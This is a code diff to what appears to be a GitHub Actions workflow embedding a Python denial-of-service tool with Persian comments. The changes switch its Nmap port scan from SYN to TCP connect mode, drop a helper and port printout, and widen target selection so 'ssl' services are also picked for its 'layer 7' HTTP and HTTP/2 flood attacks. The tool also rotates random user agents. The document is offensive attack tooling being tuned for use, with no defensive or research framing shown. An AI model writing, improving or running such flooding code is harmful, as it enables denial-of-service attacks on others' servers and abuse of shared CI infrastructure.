@@ -64,11 +64,11 @@ jobs:
               except socket.gaierror:
                   return None
 
-          # ========== ۲. اسکن پورت‌های باز با Nmap ==========
+          # ========== ۲. اسکن پورت‌های باز با Nmap (استفاده از -sT به جای -sS) ==========
           def scan_open_ports(ip, port_range='1-10000'):
               console.print(f"🔍 شروع اسکن روی {ip}...")
               nm = nmap.PortScanner()
-              nm.scan(hosts=ip, arguments=f'-sS -sV -p {port_range} --min-rate 1000')
+              nm.scan(hosts=ip, arguments=f'-sT -sV -p {port_range} --min-rate 1000')
               open_ports = []
               if ip in nm.all_hosts():
                   for proto in nm[ip].all_protocols():
@@ -87,11 +87,6 @@ jobs:
 
           def get_random_ua():
               return random.choice(USER_AGENTS)
-
-          def get_default_port_for_service(service):
-              if 'http' in service:
-                  return 443 if 'ssl' in service else 80
-              return None
 
           # ========== ۴. موتورهای حمله ==========
           async def http_worker(url):
@@ -170,12 +165,10 @@ jobs:
               if not open_ports:
                   console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
                   sys.exit(1)
-              for p in open_ports:
-                  console.print(f"  ✅ پورت {p['port']} ({p['service']})")
               # انتخاب فقط پورت‌های HTTP/HTTPS برای حملات لایه ۷
               if ATTACK in ('l7_http_flood', 'l7_http2_flood'):
                   for p in open_ports:
-                      if 'http' in p['service'].lower():
+                      if 'http' in p['service'].lower() or 'ssl' in p['service'].lower():
                           target_ports.append(p['port'])
                   if not target_ports:
                       console.print("[red]❌ هیچ سرویس HTTP/HTTPS برای حمله لایه ۷ پیدا نشد.[/red]")
